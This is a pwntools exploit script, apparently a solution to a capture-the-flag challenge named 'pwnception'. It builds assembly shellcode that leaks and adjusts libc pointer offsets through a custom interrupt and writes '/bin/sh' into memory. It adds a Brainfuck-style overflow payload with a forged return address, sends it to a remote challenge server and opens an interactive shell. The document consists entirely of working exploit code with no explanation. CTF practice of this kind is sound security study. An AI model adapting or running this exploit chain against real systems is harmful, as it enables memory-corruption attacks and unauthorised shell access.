from pwn import *
context.arch = "amd64"

sc = asm(shellcraft.open("a"*0x48+"\x8c\x00",0))

ksc = asm("""
mov rax,0
mov rdi,0x500
int 0x71

mov rax,2
mov rdi,0x400f00
mov rsi,8
int 0x71

mov rax,0
mov rdi,0xf0
int 0x71

mov rax,3
int 0x71

mov rax,1
mov rdi,0x400f00
add qword ptr [rdi],0xb50-0x6c0
mov rsi,8
int 0x71

mov rax,0
mov rdi,0xf0
int 0x71

mov rax,0
mov rdi,0xf0
int 0x71

mov rax,2
mov rdi,0x400f00
mov rsi,0x20
int 0x71

sub qword ptr [rdi+0x18],0x63187d

mov rax,0
mov rdi,0xa0
int 0x71

mov rax,3
int 0x71

mov rax,1
mov rdi,0x400f18
add qword ptr [rdi],0x3ed8e8
mov rsi,8
int 0x71

mov rax,0
mov rdi,0xa0
int 0x71

mov rax,0
mov rdi,0xa0
int 0x71

mov rax,1
mov rdi,0x400f18
sub qword ptr [rdi],0x3ed8e8-0x4f550
mov rsi,8
int 0x71

mov rax,0
mov rdi,0x30
int 0x71

mov rbx,0x68732f6e69622f
mov rdi,0x400f18
mov [rdi],rbx
mov rax,1
mov rsi,8
int 0x71
mov rax,3
int 0x71



l:
 jmp l
""")

payload = ",[>,]"
payload += ">"*9
payload += "+"*0x10
payload += ">"*8
payload += ",>"*0x28
payload += "!"
payload += "a"*0x1007 +"\x00"
payload += flat(0x400257,len(sc)+len(ksc),[0x400000]*3)

#r = process('./main kernel userland'.split(),env={"LD_LIBRARY_PATH":"."})
r = remote("pwnception.chal.perfect.blue", 1)
input(":")
r.send(payload+sc+ksc)

r.send(("a"*0x50+p64(0x400000+len(sc))).ljust(0x38f,"\x00"))
r.interactive()

#open("payload","w").write(payload)


